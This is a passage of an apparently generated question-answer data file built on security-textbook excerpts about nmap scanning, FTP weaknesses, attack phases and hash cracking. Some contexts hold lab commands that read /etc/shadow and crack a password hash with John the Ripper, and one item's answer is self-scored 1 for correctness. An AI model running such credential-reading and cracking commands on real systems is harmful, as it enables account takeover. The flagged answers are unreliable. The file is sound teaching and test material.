fingerprint:\n\nOS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T\n\nOS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A\n\nOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B\n\nOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\n\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\n\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\n\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\n\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\n\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\n\nOS:0%CD=S)\n\nNetwork Distance: 1 hop\n\nTRACEROUTE\n\nHOP RTT     ADDRESS\n\n1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat additional information did you learn from the `-A`{.literal} option? How do you think this could be exploited?\n\n:::\n\n</aside>\n\nNow, using the `scanner`{.literal} container you are currently on see what you can find out about `victim`{.literal}.\n\n[This man page may be of some help.](https://linux.die.net/man/1/ftp){.link}\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: Remembering what you learned in the *Hash it Out* lab, what is the root password on the victim machine?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on\n\n`victim`{.literal}?\n\n:::\n\n</aside>\n\nWhen you are all done poking around, you can exit the shell and run `docker-compose down`{.literal} to stop\n\n`victim`{.literal} from running in the background.\n\n:::::::::\n\n:::: {.section .sect2 title=\"4.6. Review Questions\"}\n", "topic": "Understanding how to identify and mitigate potential security vulnerabilities in FTP configurations.", "question": "Based on the provided context, what specific vulnerabilities are present in the ProFTPD configuration on the \u2018victim\u2019 machine, and how could an attacker potentially exploit these weaknesses?", "answer": "Default root password, anonymous FTP login.", "explanation": "The context reveals a default root password, anonymous FTP login allowed, and a lack of strong security practices. An attacker could exploit the default root password to gain full control of the system. The anonymous FTP login further exposes the system to potential compromise.", "question_token_count": 36, "answer_correctness_score": 9, "explanation_validity_score": 8, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 9, "choices": null}
{"context": "### 9.5.6. Privilege Escalation {#_computer_systems_security_planning_for_success.xhtml__privilege_escalation_2}\nOnce an attacker has a foothold on the internal network they will typically work to elevate privilege. This may be done\n\nlocally, through an exploit, by tricking the user into elevating the privileges of a running script, by stealing\n\ncredentials over-the-wire, or by leveraging running system processes.\n\nThe key in this phase is that the security of the machine has been breached, but if the attacker does not have an admin\n\naccount on the machine the actual extend of the damage may not be that bad. By elevating the privilege to an admin the\n\nattacker can fully control the asset.\n\n:::\n\n::: {.section .sect3 title=\"9.5.7. Defense Evasion\"}\n\n\n### 9.5.7. Defense Evasion {#_computer_systems_security_planning_for_success.xhtml__defense_evasion}\nIt is important to note that while this is occurring, malware scanners, endpoint management software, and possibly even\n\nmembers of the SOC will be actively working to detect and remove malware. An attacker will take steps, typically\n\nautomated, to make it had to detect their presence. This may involve disabling malware scanners, clearing logs,\n\ndeploying in a container, running within an already running process, and other methods of obfuscation. Defense evasion\n\nmakes the job of the security team that much harder.\n\n:::\n\n::: {.section .sect3 title=\"9.5.8. Credential Access\"}\n", "topic": "The strategic importance of credential access in the context of an attacker\u2019s progression within a compromised network.", "question": "Considering the context, what is the primary operational advantage conferred by an attacker successfully elevating privileges to an administrative level on a compromised system?", "answer": "Full control of the asset.", "explanation": "The text explicitly states that gaining admin rights allows the attacker to \"fully control the asset,\" representing the most significant impact and potential for widespread damage.", "question_token_count": 29, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 9, "question_groundedness_score": 10, "avg_answer_token_count": 7, "choices": null}
{"context": "### 9.5.14. Impact {#_computer_systems_security_planning_for_success.xhtml__impact}\nThe impact of the attack needs to be analyzed as well. The impact can include losing access to the asset, loss of data,\n\ndata held for ransom, defacement, denial of service, or resource hijacking. All of these things can interrupt business\n\ncontinuity and ultimately cost a company money. The impact of an attack needs to be well understood to make security\n\ndecisions in the future.\n\n:::\n\n:::::::::::::::::\n\n:::: {.section .sect2 title=\"9.6. Review Questions\"}\n\n\n## 9.6. Review Questions {#_computer_systems_security_planning_for_success.xhtml_incident_review}\n::: description-list\n\n[What is an SOC and what does it do?]{.term}\n\n:   []{.principal}\n\n[What is an SPOF? Give an example]{.term}\n\n:   []{.principal}\n\n[How does the ATT&CK framework differ from the Cyber Killchain Framework? You may need to refer to the [Malware](#_computer_systems_security_planning_for_success.xhtml__malware){.xref} chapter.]{.term}\n\n:   []{.principal}\n\n:::\n\n::::\n\n:::: {.section .sect2 title=\"9.7. Lab: Reporting on the 2014 Sony Pictures Hack\"}\n", "topic": "The importance of understanding attack impact for informed security decision-making.", "question": "Beyond merely listing the potential consequences, explain how a comprehensive understanding of an attack's impact informs the prioritization of security investments and mitigation strategies.", "answer": "It guides resource allocation and risk management.", "explanation": "The text states that understanding the impact is crucial for \u201cmaking security decisions in the future.\u201d This question asks for an elaboration on *how* that understanding translates into practical action \u2013 prioritizing investments and strategies.", "question_token_count": 29, "answer_correctness_score": 6, "explanation_validity_score": 5, "question_clarity_score": 6, "question_groundedness_score": 7, "avg_answer_token_count": 9, "choices": null}
{"context": "### 4.4.5. RDP {#_computer_systems_security_planning_for_success.xhtml__rdp}\nRemote Desktop Protocol (RDP) is build into Windows and is typically used to control a machine remotely. It works over\n\nport 3389 via TCP or UDP. While RDP can be quite useful for performing remote administration on a remote machine, it can\n\nalso be a large security hole if a bad actor gains access. RDP use in ransomware attacks is on the rise as ransomware\n\nprograms may use RDP to find other machines to attack.\n\n:::\n\n::: {.section .sect3 title=\"4.4.6. Telnet\"}\n\n\n### 4.4.6. Telnet {#_computer_systems_security_planning_for_success.xhtml__telnet}\nTelnet is an antiquated remote administration tool that gives access to a shell via a cleartext channel. Telnet runs on\n\nport 23 and while still occasionally in use it should largely be phased out. You will still find telnet in embedded\n\napplications and legacy systems. You may also see the client being used to inspect other types of traffic. For example,\n\nyou can use a telnet client to submit HTTP requests or send email via SMTP.\n\n:::\n\n::: {.section .sect3 title=\"4.4.7. SSH\"}\n", "topic": "What makes SSH a preferable alternative to RDP and Telnet in terms of remote administration security?", "question": "What fundamental security characteristic of Telnet renders it unsuitable for secure remote administration, and how does this contrast with the approach of SSH?", "answer": "Cleartext transmission.", "explanation": "Telnet transmits data in cleartext, exposing sensitive information to potential interception, while SSH employs encryption, safeguarding data during transmission.", "question_token_count": 27, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 5, "avg_answer_token_count": 5, "choices": null}
{"context": "### 4.2.2. ICMP {#_computer_systems_security_planning_for_success.xhtml__icmp}\nInternet Control Message Protocol (ICMP) is largely used to send messages between systems when IP doesn't work. For\n\nexample, lets say we tried to connect to a host but our router doesn't know how to get there. Our router can send us an\n\nICMP *Destination Unreachable* message to let us know that something is going wrong. Because ICMP messages work at the\n\nnetwork layer, we will receive this message even if there is an issue with the internet layer.\n\nThe most common use for ICMP is the `ping`{.literal} command. `ping`{.literal} sends an ICMP echo request to check to\n\nsee if a host is up. By responding to the request with the data included in the request we can assume that the host is\n\nup and functioning.\n\nICMP is also used in the `traceroute`{.literal} command. `traceroute`{.literal} incrementally increase the Time To Live\n\n(TTL) field of ICMP packets and watches for *TTL Exceeded* messages to determine what route packets are taking to get to\n\na host. Example `traceroute`{.literal} output is shown below:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 60 byte packets\n\n 1  ryan.njitdm.campus.njit.edu (172.24.80.1)  0.217 ms  0.200 ms  0.252 ms\n\n 2  ROOter.lan (192.168.2.1)  5.790 ms  5.765 ms  6.275 ms\n\n 3  * * * \u2460\n\n 4  B4307.NWRKNJ-LCR-21.verizon-gni.net (130.81.27.166)  19.166 ms  19.144 ms  21.097 ms\n\n 5  * * * \u2460\n\n 6  0.ae1.GW7.EWR6.ALTER.NET (140.222.2.227)  12.376 ms  14.634 ms 0.ae2.GW7.EWR6.ALTER.NET (140.222.2.229)  9.805 ms\n\n 7  209.85.149.208 (209.85.149.208)  9.782 ms  10.331 ms  9.192 ms\n\n 8  * * * \u2460\n\n 9  dns.google (8.8.8.8)  11.313 ms  9.761 ms  9.758 ms</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice these routers not responding to ICMP packets\n\n:::\n\nDespite the usefulness of ICMP, ICMP packets from external sources are often ignored. Network engineers use ICMP to\n\ntroubleshoot their own networks, but it would be a security issue to allow outside parties to do the same. As such, do\n\nnot expect all external hosts to respond to pings. They may still be up, but you'll need to figure out [another way to\n\ndetect them.](https://nmap.org/book/man-host-discovery.html){.link}\n\n::::\n\n::: {.section .sect3 title=\"4.2.3. NAT\"}\n", "topic": "The reasons for the often-ignored responses to ICMP requests from external hosts, relating to network security.", "question": "Beyond the stated security implications, what fundamental network design principle underlies the practice of restricting external access to ICMP traffic, and how does this relate to the broader concept of network segmentation?", "answer": "The restriction is based on minimizing the attack surface and preventing reconnaissance, aligning with network segmentation principles.", "explanation": "The answer requires recognizing that the restriction on external ICMP access is driven by the principle of minimizing attack surface and preventing reconnaissance activities. It connects this to network segmentation, where isolating sensitive systems limits the impact of potential breaches.", "question_token_count": 37, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 7, "question_groundedness_score": 6, "avg_answer_token_count": 20, "choices": null}
{"context": "## 3.2. Malware Targets {#_computer_systems_security_planning_for_success.xhtml__malware_targets}\n::: float-group\n\n<figure class=\"image left\">\n\n<div class=\"content\">\n\n<img src=\"images/malware.png\" width=\"500\" alt=\"malware\" />\n\n</div>\n\n<figcaption>Malware Distribution by OS (Q1 2020)<sup>[<a href=\"#fn1\" class=\"footnote-ref\" id=\"fnref1\"\n\nrole=\"doc-noteref\"><sup>1</sup></a>]</sup></figcaption>\n\n</figure>\n\n<section id=\"footnotes\" class=\"footnotes footnotes-end-of-document\" role=\"doc-endnotes\">\n\n<hr />\n\n<ol>\n\n<li id=\"fn1\"><p>Distribution of malware detections Q1 2020, by OS. Joseph Johnson. Apr 11, 2022.<a href=\"#fnref1\"\n\nclass=\"footnote-back\" role=\"doc-backlink\">\u21a9\ufe0e</a></p></li>\n\n</ol>\n\n</section>\n\nThe most popular target for malware is the Windows OS by quite a large margin. This is due largely to its popularity as\n\na desktop operating system. The second largest target is web browsers, which afford malware a unique cross-platform\n\nreach. The third largest target is the Android mobile operating system, which while technically Linux runs mostly on\n\nmobile phones. Both Linux and Mac do not receive as much malware attention. While this may be partially due to the\n\nopen-source nature of Linux and the BSD kernel used by Macs, it is also partially due to the lack of popularity of each\n\nof these operating systems. Malware is often widely distributed, meaning it can target only the most popular/possibly\n\nweakest links and still be successful.\n\n:::\n\n<aside class=\"sidebar titled\" title=\"Zero Days\" epub:type=\"sidebar\">\n", "topic": "Malware distribution strategies prioritize targeting the most popular operating systems to maximize the potential impact of attacks.", "question": "Considering the observed malware distribution patterns, what strategic rationale underlies the prioritization of Windows, web browsers, and Android as primary targets, and how does this align with common malware propagation techniques?", "answer": "Targeting the most popular operating systems for maximum reach and impact.", "explanation": "The answer correctly identifies the core strategy: targeting the most popular operating systems to maximize the potential for infection due to the larger user base.", "question_token_count": 39, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 6, "question_groundedness_score": 9, "avg_answer_token_count": 14, "choices": null}
{"context": "## 2.11. Lab: Hash it Out {#_computer_systems_security_planning_for_success.xhtml__lab_hash_it_out}\nA *hash* is a one-way cryptographic function that produces a *unique* set of characters for a given *message*. In a\n\nperfect world, given a hash you should *not* be able to determine what the original message was, but given a hash and\n\nthe original message you can check that the hash matches the message. Before we dive into the uses of a hash, lets try\n\nto further understand it by looking at a simple and consequently poor hashing algorithm.^\\[[^3]\\]^\n\n**Anagram Hash**\n\nLet's assume we wanted to hash the message \\\"Hello from Karl\\\" so that we can have a string of characters the uniquely\n\nrepresent that phrase. One way to do it would be to strip all the punctuation in the message, make everything lowercase,\n\nand then arrange all the letters alphabetically. \\\"Hello from Karl\\\" becomes \\\"aefhklllmoorr\\\". You can think of it like\n\nsaying, \\\"There is one \\'a\\' in the message, one \\'e\\' in the message, one \\'f\\' in the message\\', one \\'k\\' in the\n\nmessage, three \\'l's in the message...\u200b\\\" Now our hash, \\\"aefhklllmoorr\\\", can be used to uniquely identify the phrase.\n\nNow assume Karl wants to send us a message but he can't trust the person sending the message. He could use the untrusted\n\nparty to send us the message and then put the hash someplace public like on a website. We could use the hash to know the\n\nmessage came from Karl *and* if anyone else got the hash they would not be able to discern the message because a hash is\n\na one-way function. \\\"aefhklllmoorr\\\" reveals very little about the message, but it can be used to check its accuracy.\n\nHopefully this is beginning to show the power of hashes. Now lets examine another very common usecase and find out\n\nexactly why this is a terrible algorithm.\n\nAssume you run a website where a user uses a password to log in. You want to make sure users are using their password\n\nwhen they log in, but you do not want to store the password on your website. This is quite common. If you website was\n\nbreached you don't want to leak a bunch of people's passwords. What do you do? What you could do is store a hash of\n\ntheir password, hash the password when they try to login, and compare the hashes. For example if our password was\n\n\\\"password\\\" using our basic hash algorithm the hash would be \\\"adoprssw\\\". We could store \\\"adoprssw\\\" in our database,\n\nuse it for comparison during login, and if someone were to ever steal the data in our database they wouldn't know that\n\nthe original password is \\\"password\\\". This may prevent an attacker from exploiting the fact that many people use the\n\nsame password on multiple sites.\n\nThe problem is that there are many things that hash to \\\"adoprssw\\\" including \\\"wordpass\\\", \\\"drowsaps\\\", or even the\n\nhash we're storing: \\\"adoprssw\\\". When multiple messages have the same hash it is referred to as a *collision* and this\n\nparticular algorithm is useless because it generates so many of them.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat would the anagram hash of \\\"AlwaysDancing\\\" be?\n\n:::\n\n</aside>\n\nNow that we understand what hashes do and to some extant how they are possible, lets look at a much more useful hash\n\nfunction.\n\n**MD5**\n\nFor this section, we are going to be using Docker and a terminal. [Please follow these directions for installing\n\nDocker.](https://docs.docker.com/get-docker/){.link} For Windows you can use the [Windows Terminal\n\napp](https://www.microsoft.com/en-us/p/windows-terminal/9n0dx20hk701){.link} and in MacOS you can use the preinstalled\n\nTerminal app. Gray boxes show the commands as typed into the terminal with typical output where possible. Your prompt\n\n(the part shown before the command) may differ depending on your OS.\n\nStart by running a BASH shell on a custom Linux container:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>ryan@R90VJ3MK:/windir/c/Users/rxt1077/it230/docs$ docker run -it ryantolboom/hash \u2460\n\nroot@8e0962021f85:/\u2461</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Here we are using the Docker run command interactively (-it) as this container runs bash by default\n\n2.  *\u2461* Notice the new prompt showing that we are root on this container\n\n:::\n\nMD5 is a message-digest algorithm that produces significantly better hashes than our Anagram algorithm. Most Linux\n\ndistributions include a simple utility for creating an MD5 hash based on a file's contents. This command is named\n\nmd5sum. Typically this is used to detect if a file has been tampered with. A website may provide links to download\n\nsoftware as well as an MD5 hash of the files so that you know what you've downloaded is correct. Similarly a security\n\nsystem may keep md5sums (MD5 hashes) of certain critical files to determine if they have been tampered with by malware.\n\nLet's practice taking the md5sum of the `/etc/passwd`{.literal} file:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@8e0962021f85:/# md5sum /etc/passwd\n\n9911b793a6ca29ad14ab9cb40671c5d7  /etc/passwd \u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* The first part of this line is the MD5 hash, the second part is the file name\n\n:::\n\nNow we'll make a file with *your* first name in it and store it in /tmp/name.txt:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@8e0962021f85:/# echo &quot;&lt;your_name&gt;&quot; &gt;&gt; /tmp/name.txt \u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Substitute your actual first name for \\<your_name\\>\n\n:::\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat is the md5sum of `/tmp/name.txt`{.literal}?\n\n:::\n\n</aside>\n\nFor our final activity, lets take a look at some of the weaknesses of hashes.\n\n**Hash Cracking**\n\nPasswords in a Linux system are hashed and stored in the `/etc/shadow`{.literal} file. Let's print out the contents of\n\nthat file to see how it looks:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7f978dd90746:/# cat /etc/shadow\n\nroot:*:19219:0:99999:7:::\n\ndaemon:*:19219:0:99999:7:::\n\nbin:*:19219:0:99999:7:::\n\nsys:*:19219:0:99999:7:::\n\nsync:*:19219:0:99999:7:::\n\ngames:*:19219:0:99999:7:::\n\nman:*:19219:0:99999:7:::\n\nlp:*:19219:0:99999:7:::\n\nmail:*:19219:0:99999:7:::\n\nnews:*:19219:0:99999:7:::\n\nuucp:*:19219:0:99999:7:::\n\nproxy:*:19219:0:99999:7:::\n\nwww-data:*:19219:0:99999:7:::\n\nbackup:*:19219:0:99999:7:::\n\nlist:*:19219:0:99999:7:::\n\nirc:*:19219:0:99999:7:::\n\ngnats:*:19219:0:99999:7:::\n\nnobody:*:19219:0:99999:7:::\n\n_apt:*:19219:0:99999:7:::\n\nkarl:$y$j9T$oR2ZofMTuH3dpEGbw6c/y.$TwfvHgCl4sIp0b28YTepJ3YVvl/3UyWKeLCmDV1tAd9:19255:0:99999:7::: \u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* As you can see here the `karl`{.literal} user has a long hash immediately after their username\n\n:::\n\nOne of the problems with hashes are that if people choose simple passwords, they can be easily cracked by a program that\n\ntakes a wordlist of common passwords, generates their hashes, and then checks to see if the hash is the same. While a\n\nhash may be a one-way function, it is still subject to this type of attack. We're use a program called [John the\n\nRipper](https://www.openwall.com/john/){.link} and do exactly that.\n\nJohn the Ripper is already installed on this container along with a simple wordlist. We will tell it to use the default\n\nwordlist to try and determine what the password is that matches karl's hash in `/etc/shadow`{.literal}:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@8e0962021f85:/# john --format=crypt --wordlist=/usr/share/john/password.lst /etc/shadow\n\nLoaded 1 password hash (crypt, generic crypt(3) [?/64])\n\nPress &#39;q&#39; or Ctrl-C to abort, almost any other key for status\n\n&lt;karl&#39;s password&gt;             (karl)\n\n1g 0:00:00:01 100% 0.6211g/s 178.8p/s 178.8c/s 178.8C/s lacrosse..pumpkin\n\nUse the &quot;--show&quot; option to display all of the cracked passwords reliably\n\nSession completed</code></pre>\n\n</figure>\n\n<aside class=\"admonition note\" title=\"Note\" epub:type=\"notice\">\n\n::: content\n\nOnce john has cracked a password it will not show it if you run it again. To *show* the passwords that have already been\n\ncracked you must run the `--show`{.literal} command with the file: `john --show /etc/shadow`{.literal}\n\n:::\n\n</aside>\n\nGiven that the password is in the included common password wordlist, `/usr/share/john/password.lst`{.literal}, you will\n\nquickly find that John the Ripper figures out that karl's password. John the Ripper can also run incrementally though\n\nall the possible character combinations, but it takes much longer. To help make these types of attacks more difficult,\n\nevery hash in `/etc/shadow`{.literal} is built off of a random number. This number is called a *salt* and is stored with\n\nthe hash. This means that instead of just trying one hash for each word in the wordlist, the hash cracker must try every\n\npossible salt for every word in the wordlist, slowing things down significantly. Modern hash crackers may use [rainbow\n\ntables](https://en.wikipedia.org/wiki/Rainbow_table){.link} so that all of the possible hashes have already been\n\ncomputed. These tables may take up terabytes of disk space, but can make cracking even complicated hashes much simpler.\n\n<p>\n\nLet's use a custom utility named\n\n<code class=\"literal\">\n\n[\\`crypt`</code>`{=html}](https://github.com/rxt1077/it230/blob/main/labs/hash/crypt.c){.link} to show that we have the\n\nactual password. This utility is already installed on your container. We will start by printing out just the line in\n\n`/etc/shadow`{.literal} that has karl's info. We will use the `grep`{.literal} command to limit out output to things\n\nthat have `karl`{.literal} in them:\n\n</p>\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7f978dd90746:/# cat /etc/shadow | grep karl\n\nkarl:$y$j9T$oR2ZofMTuH3dpEGbw6c/y.$TwfvHgCl4sIp0b28YTepJ3YVvl/3UyWKeLCmDV1tAd9:19255:0:99999:7:::</code></pre>\n\n</figure>\n\nThe first part of the shadow line is the username, karl. The next part of the shadown line, immediately following the\n\nfirst colon, is the hash information. The characters in between the first set of `$`{.literal} is the version of the\n\nhashing algorithm being used, `y`{.literal} for yescrypt in our case. The characters in between the second set of\n\n`$`{.literal} are the parameters passed to yescrypt which will always be `j9T`{.literal} for us. The characters in\n\nbetween the third set of `$`{.literal} is your salt. Finally the characters in between the fourth set of `$`{.literal}\n\nis the hash.\n\nThe \\[`crypt`{.literal}\\] utility calls the system\n\n[`crypt`{.literal}](https://man7.org/linux/man-pages/man3/crypt.3.html){.link} command and prints the output. Let's run\n\nthis utility with the password we've cracked and the first three parts of the hash information from\n\n`/etc/shadow`{.literal}. If everything goes well, you should see hash output that matches what is in\n\n`/etc/shadow`{.literal}:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7f978dd90746:/# crypt &lt;karl&#39;s password&gt; &#39;$y$j9T$oR2ZofMTuH3dpEGbw6c/y.&#39; \u2460\n\n$y$j9T$oR2ZofMTuH3dpEGbw6c/y.$TwfvHgCl4sIp0b28YTepJ3YVvl/3UyWKeLCmDV1tAd9</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Don't forget to use the actual password you cracked and put the hash info in single quotes\n\n:::\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nSubmit a screenshot with your lab showing that the output of the `crypt`{.literal} command matches the hash in\n\n/etc/shadow\n\n:::\n\n</aside>\n\n::::::::::::\n\n:::: {.section .sect2 title=\"2.12. Review Questions\"}\n", "topic": "The \u201cAnagram Hash\u201d algorithm demonstrates a flawed approach to hashing, where letters are simply alphabetized, resulting in a highly insecure representation of the original message due to its susceptibility to collisions.", "question": "Explain why the \u201cAnagram Hash\u201d algorithm described in the text is considered insecure and prone to collisions, detailing the specific steps involved and the resulting vulnerability.", "answer": "The Anagram Hash algorithm is insecure because it simply alphabetizes the message, leading to a high probability of collisions where different messages can produce the same hash value.", "explanation": "The Anagram Hash algorithm\u2019s insecurity stems from its simple method of hashing \u2013 alphabetizing the message and using the resulting characters as the hash. This process creates a high probability of collisions because different messages can produce the same sorted character sequence.  For example, \u201cHello from Karl\u201d and \u201cLarry from Hello\u201d would both result in \u201caefhklllmoorr,\u201d demonstrating a direct collision.  Because the hash function is trivial, an attacker could easily generate many different messages that produce the same hash, rendering it useless for verifying message integrity or security.", "question_token_count": 32, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 33, "choices": null}
{"context": "## 6.1. False Positives / Negatives {#_computer_systems_security_planning_for_success.xhtml__false_positives_negatives}\nWhen a security solution detects a threat, but no threat exists, that is a *false positive*. Depending on the complexity\n\nof the solution it may utilize a set of rules, indicators of compromise, or possibly even artificial intelligence to\n\ntrigger its warning system. In the case of a solution that creates a lot of false positives, it can be tiring for a team\n\nto go through each alert. Eventually teams are conditioned to ignore the alerts, making the security solution useless.\n\nThe key to lowering the false positive rate of a system is to better tune the rule set used to trigger the warnings. A\n\nsecurity team may spend time determining a baseline of events and looking for abnormalities that correspond to actual\n\nattacks. This information can then be used to build a better detection system.\n\n::::: example\n\n::: example-title\n\nWebroot Antivirus\n\n:::\n\n::: example-content\n\n[In 2017 a popular antivirus service created a bad rule that identified certain Windows operating system files as\n\nthreats.](https://www.nbcnews.com/tech/tech-news/popular-antivirus-program-mistakenly-ids-windows-threat-creating-chaos-n750521){.link}\n\nThe antivirus solution quarantined these files, which were critical for the operation of the machine. The result was a\n\nmachine that was unusable.\n\nFor 13 minutes, Webroot distributed this rule to its antivirus software shutting down operations on an untold number of\n\nmachines. Fortunately Webroot was able to quickly identify the problem and send out an update which would have allowed\n\nthe machines to automatically fix the problem. Unfortunately their infrastructure for distributing the update quickly\n\nbecame overloaded.\n\n:::\n\n:::::\n\nWhen a security solution fails to identify a threat, this is known as a *false negative*. While no solution can ever be\n\n100% effective, false negatives can undermine confidence in a product. False negatives may be resolved by a skilled SOC\n\nteam, closely monitoring what is happening. It is also possible to address false negatives through *Layered Security* a\n\nconcept that we will cover next.\n\n::::::\n\n::: {.section .sect2 title=\"6.2. Layered Security\"}\n", "topic": "What is the primary strategy for reducing the rate of false positives in a security solution, according to the text?", "question": "What action is presented as the most effective method for decreasing the number of false positive alerts generated by a security solution?", "answer": "Tuning the rule set", "explanation": "The text explicitly states that \u201cthe key to lowering the false positive rate of a system is to better tune the rule set used to trigger the warnings.\u201d", "question_token_count": 24, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 6, "choices": null}
{"context": "## 10.6. Review Questions {#_computer_systems_security_planning_for_success.xhtml_virt_review}\n::: description-list\n\n[Why might a company choose to deploy an application on the public cloud? Does this entail any new security considerations?]{.term}\n\n:   []{.principal}\n\n[Which type of service requires more trust in the provider, IaaS or PaaS? Why?]{.term}\n\n:   []{.principal}\n\n[How do the 4C's of cloud native security reflect the principle of *layered security*? Do any of the layers overlap?]{.term}\n\n:   []{.principal}\n\n:::\n\n::::\n\n::::::::::::::::::::::::\n\n<footer class=\"chapter-footer\">\n\n::: footnotes\n\n:::\n\n</footer>\n\n::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n\n[^1]: Talking Heads. (1977). Psycho killer \\[song\\]. On Talking Heads:77. Sire Records.\n\n[^2]: In actuality the code space was so small that you could even easily create a device to cycle through all possible\n\n    codes in under a minute.\n\n[^3]: This algorithm is so poor that it may be a stretch even to call it a hashing algorithm. That being said, it is\n\n    being used as a tool to explain what hashes are.\n\n[^4]: For an interesting example of how you can change but still follow a protocol, check out [SYN\n\n    cookies](https://en.wikipedia.org/wiki/SYN_cookies){.link}.\n\n[^5]: Khalaf, Emad. (2017). A Survey of Access Control and Data Encryption for Database Security. journal of King\n\n    Abdulaziz University Engineering Sciences. 28. 19-30. 10.4197/Eng.28-1.2. Reproduced under license: CC BY-NC 4.0\n", "topic": "How does the level of trust required in a cloud provider differ between Infrastructure as a Service (IaaS) and Platform as a Service (PaaS), and what are the underlying reasons for this distinction?", "question": "Considering the differing levels of control and responsibility inherent in Infrastructure as a Service (IaaS) and Platform as a Service (PaaS), which service model necessitates a greater degree of trust in the provider, and why does this increased trust stem from the nature of their respective offerings?", "answer": "Infrastructure as a Service (IaaS)", "explanation": "IaaS requires the user to manage the operating system, middleware, and applications, demanding a higher level of trust in the provider\u2019s infrastructure security. PaaS, conversely, abstracts away much of this management, shifting responsibility to the provider, thus reducing the user\u2019s required trust level.", "question_token_count": 59, "answer_correctness_score": 1, "explanation_validity_score": 2, "question_clarity_score": 9, "question_groundedness_score": 6, "avg_answer_token_count": 10, "choices": null}
{"context": "## 3.4. Indicators of Compromise {#_computer_systems_security_planning_for_success.xhtml__indicators_of_compromise}\nAn *indicator of compromise (IoC)* is an artifact with high confidence the indicates an intrusion. It is a way to tell\n\nif a machine has been a victim of malware. IoCs are publicly communicated by security professionals in an effort to help\n\nmitigate the effects of malware.\n\n:::: description-list\n\n::: title\n\nCommon IoC Types\n\n:::\n\n[Hash]{.term}\n\n:   [A hash of files that are known to be malicious. This can help in identifying trojans and worms.]{.principal}\n\n[IP addresses]{.term}\n\n:   [Tracking the IP addresses which malware connects to can be used to determine if a machine is infected.]{.principal}\n\n[URLs/Domains]{.term}\n\n:   [Tracking the URLs or domains that malware uses can also be used to determine if a machine is infected.]{.principal}\n\n[Virus definition/signature]{.term}\n\n:   [Executables and other files can be scanned for specific sequences of bytes which are unique to a particular virus.\n\n    In this way even if the malware is hiding within another file, it can still be detected.]{.principal}\n\n::::\n\n:::::\n\n:::::::::: {.section .sect2 title=\"3.5. Delivery of Malware\"}\n", "topic": "What is an indicator of compromise (IoC) and what is its primary purpose in cybersecurity?", "question": "What is the fundamental role of an indicator of compromise (IoC) within the context of cybersecurity defense?", "answer": "An artifact indicating a potential intrusion to determine system compromise.", "explanation": "The text defines an IoC as an artifact indicating a potential 